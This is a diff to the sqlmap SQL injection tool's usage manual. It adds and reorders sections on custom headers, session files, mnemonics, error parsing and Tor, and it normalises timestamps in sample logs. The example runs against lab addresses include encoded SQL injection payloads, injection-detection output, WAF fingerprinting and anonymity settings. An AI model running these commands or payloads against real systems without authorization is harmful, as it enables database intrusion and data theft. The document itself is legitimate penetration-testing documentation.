@@ -260,7 +260,6 @@ For example:
 
     python sqlmap.py -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users
 
-
 ### Target URL
 
 Option: `-u` or `--url`
@@ -378,7 +377,6 @@ Note that also the HTTP `Cookie` header is tested against SQL injection if the `
 
 ### HTTP `User-Agent` header
 
-
 Option and switch: `--user-agent` and `--random-agent`
 
 By default sqlmap performs HTTP requests with the following `User-Agent` header value:
@@ -417,7 +415,20 @@ Note that also the HTTP `Referer` header is tested against SQL injection if the 
 
 Option: `--headers`
 
-It is possible to provide extra HTTP headers by setting the `--headers` switch. Each header must be separated by a newline and it is much easier to provide them from the configuration INI file. Have a look at the sample `sqlmap.conf` file for an example.
+It is possible to provide extra HTTP headers by setting the `--headers` switch. Each header must be separated by a newline and it is much easier to provide them from the configuration INI file. You can take a look at the sample `sqlmap.conf` file for such case.
+
+Example against a MySQL target:
+
+    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z "ign,flu,bat,tec=E" --headers="Host:www.target.com\nUser-agent:Firefox 1.0" -v 5
+    [...]
+    [xx:xx:44] [TRAFFIC OUT] HTTP request [#5]:
+    GET /sqlmap/mysql/get_int.php?id=1%20AND%20%28SELECT%209351%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6161733a%2C%28SELECT%20%28CASE%20WHEN%20%285473%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%205473%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a6c666d3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 HTTP/1.1
+    Host: www.target.com
+    Accept-encoding: gzip,deflate
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    User-agent: Firefox 1.0
+    Connection: close
+    [...]
 
 ### HTTP protocol authentication
 
@@ -454,16 +465,6 @@ If the HTTP(S) proxy requires authentication, you can provide the credentials in
 `--proxy-cred` switch.
 
 Switch `--ignore-proxy` should be used when you want to run sqlmap against a target part of a local area network by ignoring the system-wide set HTTP(S) proxy server setting.
-
-### Tor anonymity network
-
-Options and switches: `--tor`, `--tor-port`, `--tor-type` and `--check-tor`
-
-If, for any reason, you need to stay anonymous, instead of passing by a single predefined HTTP(S) proxy server, you can configure a [Tor client](http://www.torproject.org/) together with [Privoxy](http://www.privoxy.org) (or similar) on your machine as explained in [Tor installation guides](https://www.torproject.org/docs/installguide.html.en). Then you can use a switch `--tor` and sqlmap will try to automatically set Tor proxy connection settings.
-
-In case that you want to manually set the type and port of used Tor proxy, you can do it with options `--tor-type` and `--tor-port` (e.g. `--tor-type=SOCKS5 --tor-port 9050`).
-
-You are strongly advised to use `--check-tor` occasionally to be sure that everything was set up properly. There are cases when Tor bundles (e.g. Vidalia) come misconfigured (or reset previously set configuration) giving you a false sense of anonymity. Using this switch sqlmap will check that everything works as expected by sending a single request to an official [Are you using Tor?](https://check.torproject.org/) page before any target requests. In case that check fails, sqlmap will warn you and abruptly exit.
 
 ### Delay between each HTTP request
 
@@ -1548,11 +1549,17 @@ A sample command line for adding a registry key hive follows:
 
 ## General
 
+### Load session from a stored (.sqlite) file
+
+Option: `-s`
+
+sqlmap automatically creates a persistent session SQLite file for each target, inside dedicated output directory, where it stores all data required for session resumal. If user wants to explicitly set the session file location (e.g. for storing of session data for multiple targets at one place) he can use this option.
+
 ### Log HTTP(s) traffic to a textual file
 
 Option: `-t`
 
-This switch requires an argument that specified the textual file to write all HTTP(s) traffic generated by sqlmap - HTTP(s) requests and HTTP(s) responses. 
+This option requires an argument that specified the textual file to write all HTTP(s) traffic generated by sqlmap - HTTP(s) requests and HTTP(s) responses. 
 
 This is useful primarily for debug purposes.
 
@@ -1580,12 +1587,12 @@ Example run against a MySQL target:
 
     $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3
     [...]
-    [11:54:53] [INFO] starting crawler
-    [11:54:53] [INFO] searching for links with depth 1
-    [11:54:53] [WARNING] running in a single-thread mode. This could take a while                                                                                                                                                               
-    [11:54:53] [INFO] searching for links with depth 2
-    [11:54:54] [INFO] heuristics detected web page charset 'ascii'
-    [11:55:00] [INFO] 42/56 links visited (75%)
+    [xx:xx:53] [INFO] starting crawler
+    [xx:xx:53] [INFO] searching for links with depth 1
+    [xx:xx:53] [WARNING] running in a single-thread mode. This could take a while
+    [xx:xx:53] [INFO] searching for links with depth 2
+    [xx:xx:54] [INFO] heuristics detected web page charset 'ascii'
+    [xx:xx:00] [INFO] 42/56 links visited (75%)
     [...]
 
 ### Delimiting character used in CSV output
@@ -1673,10 +1680,10 @@ Example against a PostgreSQL target:
     $ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" -z "flu,bat,tec=E" --banner --hex -v 3 --parse-errors
 
     [...]
-    [20:01:14] [INFO] fetching banner
-    [20:01:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)
-    [20:01:15] [INFO] parsed error message: 'pg_query() [<a href='function.pg-query'>function.pg-query</a>]: Query failed: ERROR:  invalid input syntax for type numeric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:" in <b>/var/www/sqlmap/libs/pgsql.inc.php</b> on line <b>35</b>'
-    [20:01:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by
+    [xx:xx:14] [INFO] fetching banner
+    [xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)
+    [xx:xx:15] [INFO] parsed error message: 'pg_query() [<a href='function.pg-query'>function.pg-query</a>]: Query failed: ERROR:  invalid input syntax for type numeric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:" in <b>/var/www/sqlmap/libs/pgsql.inc.php</b> on line <b>35</b>'
+    [xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by
     GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2
     [...]
 
@@ -1685,6 +1692,47 @@ Example against a PostgreSQL target:
 Option: `--output-dir`
 
 sqlmap by default stores session and result files inside a subdirectory `output`. In case that user wants to use a different location for it he can use this option (e.g. `--output-dir=/tmp`).
+
+### Parse DBMS error messages from response pages
+
+Switch: `--parse-errors`
+
+If the web application is configured in debug mode so that it displays in the HTTP responses the back-end database management system error messages, sqlmap can parse and display them for you.
+
+This is useful for debugging purposes like understanding why a certain enumeration or takeover switch does not work - it might be a matter of session user's privileges and in this case you would see a DBMS error message along the lines of `Access denied for user  <SESSION USER>`. 
+
+Example against a Microsoft SQL Server target:
+
+    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" -z "ign,flu,tec=U" --parse-errors
+    [...]
+    [xx:xx:17] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.
+    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
+    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.
+    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
+    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.
+    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
+    [xx:xx:17] [INFO] target URL appears to have 3 columns in query
+    [...]
+
+### Save options in a configuration INI file
+
+Switch: `--save`
+
+It is possible to save the command line options to a configuration INI file. The generated file can then be edited and passed to sqlmap with the `-c` option as explained above.
+
+### Tor anonymity network
+
+Options and switches: `--tor`, `--tor-port`, `--tor-type` and `--check-tor`
+
+If, for any reason, you need to stay anonymous, instead of passing by a single predefined HTTP(S) proxy server, you can configure a [Tor client](http://www.torproject.org/) together with [Privoxy](http://www.privoxy.org) (or similar) on your machine as explained in [Tor installation guides](https://www.torproject.org/docs/installguide.html.en). Then you can use a switch `--tor` and sqlmap will try to automatically set Tor proxy connection settings.
+
+In case that you want to manually set the type and port of used Tor proxy, you can do it with options `--tor-type` and `--tor-port` (e.g. `--tor-type=SOCKS5 --tor-port 9050`).
+
+You are strongly advised to use `--check-tor` occasionally to be sure that everything was set up properly. There are cases when Tor bundles (e.g. Vidalia) come misconfigured (or reset previously set configuration) giving you a false sense of anonymity. Using this switch sqlmap will check that everything works as expected by sending a single request to an official [Are you using Tor?](https://check.torproject.org/) page before any target requests. In case that check fails, sqlmap will warn you and abruptly exit.
 
 ### Update sqlmap
 
@@ -1696,13 +1744,31 @@ If, for any reason, this operation fails, run `git pull` from your sqlmap workin
 
 This is strongly recommended **before** reporting any bug to the [mailing lists](http://www.sqlmap.org/#ml).
 
-### Save options in a configuration INI file
-
-Switch: `--save`
-
-It is possible to save the command line options to a configuration INI file. The generated file can then be edited and passed to sqlmap with the `-c` option as explained above. 
-
 ## Miscellaneous
+
+### Use short mnemonics
+
+Option: `-z`
+
+It could become tedious to type all desired options and switches, especially for those that are used most often (e.g. `--batch --random-agent --ignore-proxy --technique=BEU`). There is a simpler and much shorter way how to deal with that problem. In sqlmap it's called "mnemonics".
+
+Each option and switch can be written in a shorter mnemonic form using option `-z`, separated with a comma character (`,`), where mnemonics represent only the first arbitrarily chosen part of the original name. There is no strict mapping of options and switches to their respective shortened counterparts. Only required condition is that there is no other option nor switch that has a same prefix as the desired one.
+
+Example:
+
+    python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "www.target.com/vuln.php?id=1"
+
+can be written (one of many ways) in shorter mnemonic form like:
+
+    python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=1"
+
+Another example:
+
+    python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u "www.target.com/vuln.php?id=1"
+
+can be written in shorter mnemonic form like:
+
+    python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.com/vuln.php?id=1"
 
 ### Set answers for questions
 
@@ -1714,9 +1780,9 @@ Example against a MySQL target:
 
     $ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--technique=E --answers="extending=N" --batch
     [...]
-    [21:58:56] [INFO] testing for SQL injection on GET parameter 'id'
+    [xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'
     heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-    [21:58:56] [INFO] do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] N
+    [xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] N
     [...]
 
 ### Make a beep sound when SQL injection is found
@@ -1765,31 +1831,31 @@ Example against a MySQL target protected by the ModSecurity WAF:
 
     $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --identify-waf -v 3
     [...]
-    [11:35:23] [INFO] testing connection to the target URL
-    [11:35:23] [INFO] heuristics detected web page charset 'ascii'
-    [11:35:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (United Security Providers)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application Firewall (BinarySEC)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application Firewall (art of defence Inc.)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisco Systems)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5 Networks)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Akamai Technologies)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application Firewall (Incapsula/Imperva)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application Firewall (Barracuda Networks)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application Security (IBM)'
-    [11:35:23] [DEBUG] declared web page charset 'iso-8859-1'
-    [11:35:23] [DEBUG] page not found (404)
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Firewall (Jiasule)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firewall (AQTRONIX)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'
-    [11:35:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Application Firewall (Trustwave)'. Please consider usage of tamper scripts (option '--tamper')
+    [xx:xx:23] [INFO] testing connection to the target URL
+    [xx:xx:23] [INFO] heuristics detected web page charset 'ascii'
+    [xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (United Security Providers)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application Firewall (BinarySEC)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application Firewall (art of defence Inc.)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisco Systems)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5 Networks)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Akamai Technologies)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application Firewall (Incapsula/Imperva)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application Firewall (Barracuda Networks)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application Security (IBM)'
+    [xx:xx:23] [DEBUG] declared web page charset 'iso-8859-1'
+    [xx:xx:23] [DEBUG] page not found (404)
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Firewall (Jiasule)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firewall (AQTRONIX)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'
+    [xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Application Firewall (Trustwave)'. Please consider usage of tamper scripts (option '--tamper')
     [...]
 
 ### Imitate smartphone
@@ -1819,31 +1885,6 @@ Switch: `--page-rank`
 
 Performs further requests to Google when `-g` is provided and display page rank (PR) for Google dork results.
 
-### Parse DBMS error messages from response pages
-
-Switch: `--parse-errors`
-
-If the web application is configured in debug mode so that it displays in the HTTP responses the back-end database management system error messages, sqlmap can parse and display them for you.
-
-This is useful for debugging purposes like understanding why a certain enumeration or takeover switch does not work - it might be a matter of session user's privileges and in this case you would see a DBMS error message along the lines of `Access denied for user  <SESSION USER>`. 
-
-Example against a Microsoft SQL Server target:
-
-    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" -z "ign,flu,tec=U" --parse-errors
-    [...]
-    [11:12:17] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-    [11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
-    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.
-    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
-    [11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
-    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.
-    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
-    [11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
-    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.
-    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
-    [11:12:17] [INFO] target URL appears to have 3 columns in query
-    [...]
-
 ### Safely remove all content from output directory
 
 Switch `--purge-output`
@@ -1854,13 +1895,13 @@ Example run:
 
     $ python sqlmap.py --purge-output -v 3
     [...]
-    [11:38:55] [INFO] purging content of directory '/home/user/sqlmap/output'...
-    [11:38:55] [DEBUG] changing file attributes
-    [11:38:55] [DEBUG] writing random data to files
-    [11:38:55] [DEBUG] truncating files
-    [11:38:55] [DEBUG] renaming filenames to random values
-    [11:38:55] [DEBUG] renaming directory names to random values
-    [11:38:55] [DEBUG] deleting the whole directory tree
+    [xx:xx:55] [INFO] purging content of directory '/home/user/sqlmap/output'...
+    [xx:xx:55] [DEBUG] changing file attributes
+    [xx:xx:55] [DEBUG] writing random data to files
+    [xx:xx:55] [DEBUG] truncating files
+    [xx:xx:55] [DEBUG] renaming filenames to random values
+    [xx:xx:55] [DEBUG] renaming directory names to random values
+    [xx:xx:55] [DEBUG] deleting the whole directory tree
     [...]
 
 ### Conduct through tests only if positive heuristic(s)
@@ -1873,36 +1914,36 @@ Example against a MySQL target:
 
     $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&user=foo&id=1" --batch --smart
     [...]
-    [16:12:14] [INFO] testing if GET parameter 'ca' is dynamic
-    [16:12:14] [WARNING] GET parameter 'ca' does not appear dynamic
-    [16:12:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable
-    [16:12:14] [INFO] skipping GET parameter 'ca'
-    [16:12:14] [INFO] testing if GET parameter 'user' is dynamic
-    [16:12:14] [WARNING] GET parameter 'user' does not appear dynamic
-    [16:12:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable
-    [16:12:14] [INFO] skipping GET parameter 'user'
-    [16:12:14] [INFO] testing if GET parameter 'id' is dynamic
-    [16:12:14] [INFO] confirming that GET parameter 'id' is dynamic
-    [16:12:14] [INFO] GET parameter 'id' is dynamic
-    [16:12:14] [WARNING] reflective value(s) found and filtering out
-    [16:12:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
-    [16:12:14] [INFO] testing for SQL injection on GET parameter 'id'
+    [xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic
+    [xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic
+    [xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable
+    [xx:xx:14] [INFO] skipping GET parameter 'ca'
+    [xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic
+    [xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic
+    [xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable
+    [xx:xx:14] [INFO] skipping GET parameter 'user'
+    [xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic
+    [xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic
+    [xx:xx:14] [INFO] GET parameter 'id' is dynamic
+    [xx:xx:14] [WARNING] reflective value(s) found and filtering out
+    [xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+    [xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'
     heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
     do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] Y
-    [16:12:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-    [16:12:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable 
-    [16:12:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
-    [16:12:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable 
-    [16:12:14] [INFO] testing 'MySQL inline queries'
-    [16:12:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'
-    [16:12:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
-    [16:12:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
-    [16:12:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' injectable 
-    [16:12:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
-    [16:12:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found
-    [16:12:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-    [16:12:24] [INFO] target URL appears to have 3 columns in query
-    [16:12:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+    [xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+    [xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+    [xx:xx:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
+    [xx:xx:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable 
+    [xx:xx:14] [INFO] testing 'MySQL inline queries'
+    [xx:xx:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+    [xx:xx:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+    [xx:xx:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
+    [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' injectable 
+    [xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+    [xx:xx:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found
+    [xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+    [xx:xx:24] [INFO] target URL appears to have 3 columns in query
+    [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
     [...]
 
 ### Select tests by payloads and/or titles
@@ -1915,12 +1956,12 @@ Example against a MySQL target:
 
     $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --batch --test-filter=ROW
     [...]
-    [16:16:39] [INFO] GET parameter 'id' is dynamic
-    [16:16:39] [WARNING] reflective value(s) found and filtering out
-    [16:16:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
-    [16:16:39] [INFO] testing for SQL injection on GET parameter 'id'
-    [16:16:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'
-    [16:16:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause' injectable 
+    [xx:xx:39] [INFO] GET parameter 'id' is dynamic
+    [xx:xx:39] [WARNING] reflective value(s) found and filtering out
+    [xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+    [xx:xx:39] [INFO] testing for SQL injection on GET parameter 'id'
+    [xx:xx:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'
+    [xx:xx:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause' injectable 
     GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
     sqlmap identified the following injection points with a total of 3 HTTP(s) requests:
     ---
@@ -2011,3 +2052,6 @@ Example against a Microsoft SQL Server target:
     current user is DBA:    True
 
     [*] shutting down at 11:25:52
+
+
+[TODO] --load-cookies --pivot-column -z --alert --dependencies
